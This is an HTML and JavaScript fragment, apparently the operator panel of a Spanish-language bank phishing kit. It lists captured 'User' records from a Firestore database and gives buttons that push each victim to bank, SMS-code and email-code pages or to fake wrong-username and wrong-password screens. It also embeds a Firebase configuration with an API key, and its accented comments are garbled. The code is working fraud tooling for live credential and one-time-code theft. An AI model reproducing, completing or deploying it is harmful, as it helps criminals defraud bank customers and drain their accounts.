    <div class="container">
      <h1 class="text-center my-4">游띞Panel游띞</h1>

    <script>
      // Configuraci칩n de Firebase
      const firebaseConfig = {
  apiKey: "AIzaSyAExg896HFu93msNgwlazYfaTfcSp9Mo9Y",
  authDomain: "prrrr-cb4d7.firebaseapp.com",
  projectId: "prrrr-cb4d7",

  messagingSenderId: "881373224030",
  appId: "1:881373224030:web:2be20f6fbcb19a03bfa8cf"
};

      // Inicializar Firebase
      firebase.initializeApp(firebaseConfig);
      const db = firebase.firestore();

      // Funci칩n para mostrar los datos
      function displayData(docs) {
        const dataDiv = document.getElementById("data");
        dataDiv.innerHTML = "";

        docs.forEach((doc) => {
          console.log(doc.id);
          const docDiv = document.createElement("div");
          docDiv.className = "col-md-4 document";
          docDiv.innerHTML = `
          <div class="card">
            <div class="card-body">
              <h5 class="card-title"><strong>User:</strong> ${doc.id}</h5>
              <button class="btn btn-danger btn-sm mt-3" onclick="deleteDocument('${
                doc.id
              }')">Eliminar</button>
			  <button class="btn btn-success btn-sm mt-3" onclick="changePageToBco('${
                doc.id
              }')">Mandarlo Al Bco</button>
              <button class="btn btn-secondary btn-sm mt-3" onclick="changePageToTwo('${
                doc.id
              }')">SMS</button>

              <button class="btn btn-secondary btn-sm mt-3" onclick="changePageToThree('${
                doc.id
              }')">Correo</button>
              
              <button class="btn btn-secondary btn-sm mt-3" onclick="changePaget('${
                doc.id
              }')">Lo regresa al inicio</button>
			  <button class="btn btn-secondary btn-sm mt-3" onclick="changePageToUserinco('${
                doc.id
              }')">Usuario Incorrecto</button>
			  <button class="btn btn-secondary btn-sm mt-3" onclick="changePageToContraincoo('${
                doc.id
              }')">Clave Incorrecta</button>
			  <button class="btn btn-danger btn-sm mt-3" onclick="changePageToSapito('${
                doc.id
              }')">BRUJAS AQUI</button>
            </div>
          </div>
        `;
          dataDiv.appendChild(docDiv);
        });
      }

      // Obtener datos de Firestore
      db.collection("prolme").onSnapshot((snapshot) => {
        const docs = snapshot.docs;
        displayData(docs);
      });

      // Funci칩n para actualizar el documento
      function updateDocument(id) {
        db.collection("prolme")
          .doc(id)
          .then(() => {
            console.log("Documento actualizado con ID: ", id);
          })
          .catch((error) => {
            console.error("Error actualizando el documento: ", error);
          });
      }

      // Funci칩n para eliminar el documento
      function deleteDocument(id) {
        db.collection("prolme")
          .doc(id)
          .delete()
          .then(() => {
            console.log("Documento eliminado con ID: ", id);
          })
          .catch((error) => {
            console.error("Error eliminando el documento: ", error);
          });
      }
